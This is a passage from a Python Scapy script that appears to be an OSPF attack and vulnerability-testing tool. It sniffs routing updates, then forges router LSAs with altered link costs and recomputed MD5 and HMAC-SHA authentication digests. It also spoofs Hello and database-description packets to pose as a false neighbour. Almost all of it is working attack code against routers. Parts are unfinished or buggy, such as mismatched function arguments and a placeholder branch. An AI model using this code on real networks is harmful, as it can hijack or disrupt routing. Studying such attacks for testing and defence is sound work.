			chkvuln(keep_seq)	
		time.sleep(5)
		main()
		Attacks()	
	def Four_Disguised_attack(): #Done (make sure these same SequenceNumber, Checksum, and Age15 mins << cann't chk with chksum bc it'll be same chksum!)<cisco see as badchecksum 
		print("")
		load_contrib('ospf')
		print("Intercepting OSPF's LSU. Please wait, this may take up to 30 minutes")
		
		def stopfilter(x):
			if x[OSPF_Hdr].type == 4 and "OSPF_Router_LSA" in x : #to select only packet with Router_LSA not Network-LSA
				return True
			else:
				return False
		pkts_atk=sniff(filter="ip proto 0x59", stop_filter=stopfilter) #sniff for LSUpdate
		
		def chkvuln():
			sta4 = "     please check the OSPF Database on the routers, if the Link cost has been changed, consider vulnerable"
			print("please check the OSPF Database on the routers, if the Link cost has been changed, consider vulnerable")
		lenpkts = len(pkts_atk)-1 #to select the last packet captured from sniffed
		if get_authtype(pkts_atk[lenpkts]) == "0_no" :
			save_pcap=wrpcap("fg.pcap",pkts_atk[lenpkts])
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 1
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			#keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			print ("\n")
			print("Sending trigger packet in 10 seconds")
			print("Trigger Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Trigger Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			wrpcap("Disguised_temp.pcap",pkts_atk[lenpkts])
			
			#the disguised LSA 
			pkts_atk2 = rdpcap("fg.pcap")
			pkts_atk2[0][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk2[0][OSPF_Router_LSA].seq += 2
			seqkeepd = pkts_atk2[0][OSPF_Router_LSA].seq
			pkts_atk2[0] = pkts_atk2[0].__class__(str(pkts_atk2[0]))
			pkts_atk2[0][OSPF_Router_LSA].seq = seqkeepd
			
			#cal checksum for the disguised LSA
			pkts_atk3 = rdpcap("fg.pcap")
			pkts_atk3[0][OSPF_Router_LSA].seq += 2
			del pkts_atk3[0].chksum
			del pkts_atk3[0][OSPF_Hdr].chksum
			del pkts_atk3[0][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk3[0] = pkts_atk3[0].__class__(str(pkts_atk3[0]))
			
			
			#inject chksum3 into 2
			#pkts_atk2[0].chksum = pkts_atk3[0].chksum
			#pkts_atk2[0][OSPF_Hdr].chksum = pkts_atk3[0][OSPF_Hdr].chksum
			pkts_atk2[0][OSPF_Hdr][OSPF_Router_LSA].chksum = pkts_atk3[0][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk2[0][OSPF_Router_LSA][OSPF_Link].metric += 12
			
			print ("\n")
			print("Disguised Checksum = " + hex(pkts_atk2[0][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Disguised Sequence = " + hex(pkts_atk2[0][OSPF_Router_LSA].seq))
			keepa1=rdpcap("Disguised_temp.pcap")
			sendp(keepa1[0])
			sendp(pkts_atk2[0]) #2st packet having same seq of fightback
			
			os.remove("Disguised_temp.pcap")
			os.remove("fg.pcap")
			print("Checking for Vulnerability")
			chkvuln()
			##Check by receiveack within 10 sec, and check with same ack and Packetchksum

		elif get_authtype(pkts_atk[lenpkts]) == "1_plain" :
			#change metric and send out, reload checksum
			#print("debug_1")
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 12
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			#keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			wrpcap("Disguised_temp.pcap",pkts_atk[lenpkts])
			
			#the disguised LSA 
			pkts_atk2 = pkts_atk[lenpkts]
			pkts_atk2[OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk2[OSPF_Router_LSA].seq += 1
			del pkts_atk2.chksum
			del pkts_atk2[OSPF_Hdr].chksum
			del pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk2 = pkts_atk2.__class__(str(pkts_atk2))
			keep_seq2 = pkts_atk2[OSPF_Router_LSA].seq
			keep_chksum = pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			
			print ("\n")
			print("Disguised Checksum = " + hex(pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Disguised Sequence = " + hex(pkts_atk2[OSPF_Router_LSA].seq))
			keepa1=rdpcap("Disguised_temp.pcap")
			h=keepa1[0]
			sendp(h)
			sendp(pkts_atk2) #2st packet having same seq of fightback
			
			print("Checking for Vulnerability")
			chkvuln(keep_chksum, keep_seq2)
			##Check by receiveack within 10 sec, and check with same ack and Packetchksum
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_md" :
			#cut auth data, gen auth seq data, no need for checsum <<<< but what if LSA contain only network-lsa?? check LSTYPE first!!!
			#print("debug_2md")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 12
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			#keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #cut out hash
			#print key_padd
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			wrpcap("Disguised_temp.pcap",pkts_new) #need test, may not work with [lenpkts]
	
			
			#the disguised LSA 
			pkts_atk2 = pkts_atk[lenpkts]
			pkts_atk2[OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk2[OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk2[OSPF_Router_LSA].seq += 1
			del pkts_atk2.chksum
			del pkts_atk2[OSPF_Hdr].chksum
			del pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk2 = pkts_atk2.__class__(str(pkts_atk2))
			keep_seq2 = pkts_atk2[OSPF_Router_LSA].seq
			keep_chksum = pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			
			ospf_header_nov4 = pkts_atk2[OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[OSPF_Hdr].len] #cut out hash
			#print key_padd
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk2)[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Disguised Checksum = " + hex(pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Disguised Sequence = " + hex(pkts_atk2[OSPF_Router_LSA].seq))
			keepa1=rdpcap("Disguised_temp.pcap")
			h=keepa1[0]
			sendp(h)
			sendp(pkts_new) #2st packet having same seq of fightback
			
			print("Checking for Vulnerability")
			chkvuln(keep_chksum, keep_seq2)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha1" :	
			#print("debug_2sha1")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 12
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			#keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			wrpcap("Disguised_temp.pcap",pkts_new)
			
			#the disguised LSA 
			pkts_atk2 = pkts_atk[lenpkts]
			pkts_atk2[OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk2[OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk2[OSPF_Router_LSA].seq += 1
			del pkts_atk2.chksum
			del pkts_atk2[OSPF_Hdr].chksum
			del pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk2 = pkts_atk2.__class__(str(pkts_atk2))
			keep_seq2 = pkts_atk2[OSPF_Router_LSA].seq
			keep_chksum = pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			
			ospf_header_nov4 = pkts_atk2[OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk2)[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Disguised Checksum = " + hex(pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Disguised Sequence = " + hex(pkts_atk2[OSPF_Router_LSA].seq))
			keepa1=rdpcap("Disguised_temp.pcap")
			h=keepa1[0]
			sendp(h)
			sendp(pkts_new)
			
			print("Checking for Vulnerability")
			chkvuln(keep_chksum, keep_seq2)
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha256" :	
			#print("2sha256activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 12
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			#keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			wrpcap("Disguised_temp.pcap",pkts_new)
			
			#the disguised LSA 
			pkts_atk2 = pkts_atk[lenpkts]
			pkts_atk2[OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk2[OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk2[OSPF_Router_LSA].seq += 1
			del pkts_atk2.chksum
			del pkts_atk2[OSPF_Hdr].chksum
			del pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk2 = pkts_atk2.__class__(str(pkts_atk2))
			keep_seq2 = pkts_atk2[OSPF_Router_LSA].seq
			keep_chksum = pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			
			ospf_header_nov4 = pkts_atk2[OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk2)[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Disguised Checksum = " + hex(pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Disguised Sequence = " + hex(pkts_atk2[OSPF_Router_LSA].seq))
			keepa1=rdpcap("Disguised_temp.pcap")
			h=keepa1[0]
			sendp(h)
			sendp(pkts_new)
			
			print("Checking for Vulnerability")
			chkvuln(keep_chksum, keep_seq2)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha384" :	
			#print("2sha384activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 12
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			#keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			wrpcap("Disguised_temp.pcap",pkts_new)
			
			#the disguised LSA 
			pkts_atk2 = pkts_atk[lenpkts]
			pkts_atk2[OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk2[OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk2[OSPF_Router_LSA].seq += 1
			del pkts_atk2.chksum
			del pkts_atk2[OSPF_Hdr].chksum
			del pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk2 = pkts_atk2.__class__(str(pkts_atk2))
			keep_seq2 = pkts_atk2[OSPF_Router_LSA].seq
			keep_chksum = pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			
			ospf_header_nov4 = pkts_atk2[OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk2)[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Disguised Checksum = " + hex(pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Disguised Sequence = " + hex(pkts_atk2[OSPF_Router_LSA].seq))
			keepa1=rdpcap("Disguised_temp.pcap")
			h=keepa1[0]
			sendp(h)
			sendp(pkts_new)
			
			print("Checking for Vulnerability")
			chkvuln(keep_chksum, keep_seq2)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha512" :	
			#print("2sha512activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 12
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			#keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			wrpcap("Disguised_temp.pcap",pkts_new)
			
			#the disguised LSA 
			pkts_atk2 = pkts_atk[lenpkts]
			pkts_atk2[OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk2[OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk2[OSPF_Router_LSA].seq += 1
			del pkts_atk2.chksum
			del pkts_atk2[OSPF_Hdr].chksum
			del pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk2 = pkts_atk2.__class__(str(pkts_atk2))
			keep_seq2 = pkts_atk2[OSPF_Router_LSA].seq
			keep_chksum = pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum
			
			ospf_header_nov4 = pkts_atk2[OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk2)[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Disguised Checksum = " + hex(pkts_atk2[OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Disguised Sequence = " + hex(pkts_atk2[OSPF_Router_LSA].seq))
			keepa1=rdpcap("Disguised_temp.pcap")
			h=keepa1[0]
			sendp(h)
			sendp(pkts_new)
			
			print("Checking for Vulnerability")
			chkvuln(keep_chksum, keep_seq2)
		time.sleep(5)
		main()
		Attacks()
	def Five_RemoteFalse_attack(): #Not Yet
		print("")
		load_contrib('ospf')
		print("This test does not support LLS block, please disable in the router interface before perform the test")
		print("Intercepting Hello, this will take only few seconds")
		
		def chkvuln(victimIP):
			pkts_chk=sniff(filter="ip proto 0x59", timeout = 20)
			FFb=False
			for index in range(len(pkts_chk)): 
				try: 
					if pkts_chk[index][IP].src == victimIP:
						print "Hello received, not vulnerable for Sending large number of neighbor announcement Attack"
						sta8 = "     Hello received, not vulnerable for Sending large number of neighbor announcement Attack"
						FFb=True
						break;
				except IndexError:
					FFb=False
					continue
			if FFb != True:		
				print('No Hello received, vulnerable for Sending large number of neighbor announcement Attack')
				sta8 = "     No Hello received, vulnerable for Sending large number of neighbor announcement Attack"
		
		def stopfilter(x):
			if x[OSPF_Hdr].type == 1: #to select Hello packet
				return True
			else:
				return False
				
		pkts_sniff=sniff(filter="ip proto 0x59", stop_filter=stopfilter) #sniff for Hello packet
		lenpkts = len(pkts_sniff)-1
		DRouter = pkts_sniff[lenpkts][OSPF_Hello].router
		
		def stopfilter2(x):
			if x[IP].src == DRouter: #to select Hello packet
				return True
			else:
				return False
		pkts_sniff2=sniff(filter="ip proto 0x59", stop_filter=stopfilter2)
		
		
		lenpkts = len(pkts_sniff2)-1
		pkts_atk = pkts_sniff2[lenpkts]
		
		#print(pkts_atk[OSPF_Hdr].src)  # source ospf router ID
		point = "."
		thirdpoint= [pos for pos, char in enumerate(pkts_atk[OSPF_Hdr].src) if char == point]
		thirdpoint = int(thirdpoint[2])+1 #<< find the forth octet
		plusone = int(pkts_atk[OSPF_Hdr].src[thirdpoint:])+1
		#print(plusone) #routerID plus one
		#attacker_RID = pkts_atk[OSPF_Hdr].src[0:thirdpoint] + str(plusone)
		attacker_RID = "192.168.50.20"
		#print(attacker_RID) #new RID that +1
		
		pkts_atk[OSPF_Hello].neighbors = pkts_atk[OSPF_Hdr].src # change the forged to have active neightbor as victim router ID
		#pkts_atk[IP].src = attacker_RID
		pkts_atk[IP].src = "192.168.30.90" #for debug << the real one must find another number to replace within same subnet
		pkts_atk[OSPF_Hdr].src = attacker_RID #change router ID to the one higher than current
		
		del pkts_atk[IP].len
		del pkts_atk[OSPF_Hdr].len
		del pkts_atk.chksum
		del pkts_atk[OSPF_Hdr].chksum
		pkts_atk = pkts_atk.__class__(str(pkts_atk))
		#wrpcap("Hello5.pcap",pkts_atk)
		
		del pkts_atk[OSPF_Hello].router
		del pkts_atk[OSPF_Hello].backup
		del pkts_atk[OSPF_Hello].neighbors
		del pkts_atk[IP].len
		del pkts_atk[OSPF_Hdr].len
		
		del pkts_atk.chksum
		del pkts_atk[OSPF_Hdr].chksum
		pkts_atk = pkts_atk.__class__(str(pkts_atk))
		sendp(pkts_atk)
		time.sleep(2)
		
		dbd=rdpcap("newdbd.pcap")
		dbd[0][IP].src = "192.168.30.90"
		dbd[0][IP].dst = "192.168.30.21"
		dbd[0][OSPF_Hdr].src = attacker_RID
		dbd[0].ddseq +=9000
		
		del dbd[0].chksum
		del dbd[0][OSPF_Hdr].chksum
		dbd[0] = dbd[0].__class__(str(dbd[0]))
		sendp(dbd[0])
		
		time.sleep(1)
		dbd[0].dbdescr = 3L
		dbd[0].ddseq +=1
		del dbd[0].chksum
		del dbd[0][OSPF_Hdr].chksum
		dbd[0] = dbd[0].__class__(str(dbd[0]))
		sendp(dbd[0])
		
		time.sleep(1)
		dbd[0].dbdescr = 3L
		dbd[0].ddseq +=1
		del dbd[0].chksum
		del dbd[0][OSPF_Hdr].chksum
		dbd[0] = dbd[0].__class__(str(dbd[0]))
		sendp(dbd[0])
		
		time.sleep(1)
		dbd[0].dbdescr = 3L
		dbd[0].ddseq +=1
		del dbd[0].chksum
		del dbd[0][OSPF_Hdr].chksum
		dbd[0] = dbd[0].__class__(str(dbd[0]))
		sendp(dbd[0])
		
		time.sleep(1)
		dbd[0].dbdescr = 1L
		dbd[0].ddseq +=1
		del dbd[0].chksum
		del dbd[0][OSPF_Hdr].chksum
		dbd[0] = dbd[0].__class__(str(dbd[0]))
		sendp(dbd[0])
		
		LSupd5=rdpcap("stubtran.pcap")
		sendp(LSupd5)
		
		print ("\n")
		
		if get_authtype(pkts_atk) == "0_no":
			print("ah")
			
			
	
				
		
			#chkvuln(pkts_atk[OSPF_Hello].backup)

		elif get_authtype(pkts_atk[lenpkts]) == "1_plain" :
			#change metric and send out, reload checksum
			#print("debug_1")
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq == 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
